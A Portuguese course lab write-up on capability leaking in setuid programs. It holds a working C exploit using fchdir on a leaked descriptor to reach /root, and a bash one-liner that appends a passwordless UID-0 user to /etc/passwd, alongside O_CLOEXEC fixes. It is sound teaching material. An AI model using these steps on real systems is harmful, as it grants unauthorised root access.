# Resolução do Guião - Semana 4: Controlo de Acesso

## 1. Capability Leaking

### 1. Execute o programa com um utilizador normal (que não seja o root)

Após compilar, dar as permissões de owner (root) e ativar o bit setuid (chmod 4755), executa-se o programa com um utilizador normal. O programa imprime no terminal o número do File Descriptor (por exemplo, Directory FD is 3) e de seguida deixa o utilizador numa shell normal ($).

### 2. Analise o código (e respetivo output do programa) e identifique a vulnerabilidade relacionada com capability leaking

A vulnerabilidade ocorre porque o programa abre a diretoria /root enquanto ainda tem privilégios de root (devido ao setuid), obtendo um descritor de ficheiro (FD). Depois, o programa faz drop dos privilégios (setuid(getuid())) e lança uma shell (execve). O problema central é que o file descriptor não é fechado antes do execve. Como consequência, a nova shell herda este descritor de ficheiro aberto. Isto é o chamado capability leaking, pois uma capability (acesso de leitura à diretoria /root) "vazou" para um processo não privilegiado (a shell do utilizador).

### 3. Implemente um programa que demonstre como esta vulnerabilidade pode ser explorada por um utilizador normal (sem privilégios root) para aceder a diretorias protegidas

Para explorar esta vulnerabilidade, pode-se escrever um pequeno programa em C que a shell (que herdou o FD) vai executar. Este programa usa a função fchdir() para mudar a diretoria de trabalho atual (cwd) para o FD vazado, e depois lança uma nova shell.

**Código do exploit (exploit_leaking.c):**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <fd_vazado>\n", argv[0]);
        return 1;
    }
    
    int fd = atoi(argv[1]);
    
    // Tenta mudar o diretório atual para o FD que foi vazado
    if (fchdir(fd) == -1) {
        perror("Erro no fchdir (o FD pode não ser válido)");
        return 1;
    }
    
    printf("Sucesso! O diretório atual agora é /root.\nLançando shell...\n");
    // Lança nova shell. Como o cwd foi alterado, já estamos dentro de /root
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}
```

**Como usar:**

1. Compila-se este exploit: `gcc -o exploit exploit_leaking.c`
2. Corre-se o programa vulnerável original: `./backupssi` (anota-se o FD, imaginemos que é o 3).
3. Na shell que se abriu, executa-se o exploit passando o FD: `./exploit 3`.
4. Se se fizer `ls`, verifica-se que se tem acesso de leitura aos ficheiros dentro do /root, provando o acesso não autorizado.

### 4. Implemente uma correção para o excerto de código apresentado que mitigue a vulnerabilidade e explique em que medida o problema é resolvido

A correção mais robusta é utilizar a flag O_CLOEXEC no momento em que se abre o ficheiro. Esta flag garante que o sistema operativo fecha automaticamente este file descriptor se o processo invocar a família de funções exec (como o execve usado no código).

**Código corrigido:**

Alterar a linha do open para:

```c
int dfd = open("/root", O_RDONLY | O_CLOEXEC);
```

> **Nota:** Alternativamente, poder-se-ia simplesmente adicionar a instrução `close(dfd);` imediatamente antes de execve.

**Como resolve:** Ao garantir que o FD é fechado no momento do execve, a nova shell que é lançada já não tem acesso a este descritor de ficheiro. Se se tentar correr o exploit, ele vai falhar porque o FD já não aponta para o /root.


## 2. Elevação de Privilégio

### 1. Execute o programa com um utilizador normal (que não seja o root)

Tal como no exercício anterior, ao correr o programa como utilizador normal, ele imprime no ecrã o número do FD que vazou (ex: Passwd FD leaked: 3) e entrega ao utilizador uma shell com privilégios de utilizador normal.

### 2. Analise o código (e respetivo output do programa) e identifique a vulnerabilidade existente

A vulnerabilidade é idêntica à anterior (capability leaking), mas com um impacto muito mais grave. O programa abre o ficheiro /etc/passwd em modo de escrita e append (O_WRONLY | O_APPEND) como root. Depois, faz drop dos privilégios e lança uma shell sem fechar o descritor de ficheiro. A shell resultante herda o FD, o que significa que o utilizador normal tem agora uma "porta aberta" para escrever no final do ficheiro /etc/passwd.

### 3. Identifique um possível exploit para a vulnerabilidade em questão. Pode recorrer exclusivamente à bash para o efeito

Como a shell atual tem o FD (assume-se que é o 3) associado ao /etc/passwd em modo append, não é preciso programar nada. Pode-se usar a bash para redirecionar o output de um echo diretamente para esse FD.

Na shell aberta pelo programa vulnerável, executa-se o seguinte comando:

```bash
echo "ssihacker::0:0::/root:/bin/sh" >&3
```

> **Nota:** substitui-se o 3 pelo número que o programa tiver imprimido.

### 4. Quais as implicações práticas do exploit do ponto anterior? Quais as ações que o exploit possibilita?

Ao injetar a linha `ssihacker::0:0::/root:/bin/sh` no /etc/passwd, cria-se um novo utilizador no sistema com as seguintes características:

- **Nome:** ssihacker
- **Password:** vazia (o campo entre os primeiros dois `:` está vazio, o que permite login sem password).
- **UID e GID:** 0 e 0 (este é o ID do utilizador e grupo root).
- **Diretoria e Shell:** /root e /bin/sh.

**Implicações:** A elevação de privilégio foi alcançada com sucesso. A partir daquele momento, qualquer utilizador no sistema pode simplesmente executar o comando `su ssihacker`, não lhe será pedida qualquer password, e ficará com uma shell de root, tendo controlo total (comprometimento total) do sistema.

### 5. Implemente uma correção para o excerto de código apresentado que mitigue a vulnerabilidade e explique em que medida o problema é resolvido

A solução é a mesma aplicada na primeira parte: deve-se fechar explicitamente o ficheiro antes de passar o controlo para a shell, ou usar a flag O_CLOEXEC.

**Código corrigido:**

Modificar a linha de abertura do ficheiro:

```c
int fd = open("/etc/passwd", O_WRONLY | O_APPEND | O_CLOEXEC);
```

**Como resolve:** A flag O_CLOEXEC (Close-on-Exec) informa o kernel que o file descriptor deve ser fechado automaticamente se uma função exec for chamada. Assim, quando o `execl("/bin/sh", ...)` é executado, o FD que apontava para o /etc/passwd é encerrado. A shell resultante não herda esse descritor, impossibilitando a escrita no /etc/passwd pelo utilizador não privilegiado.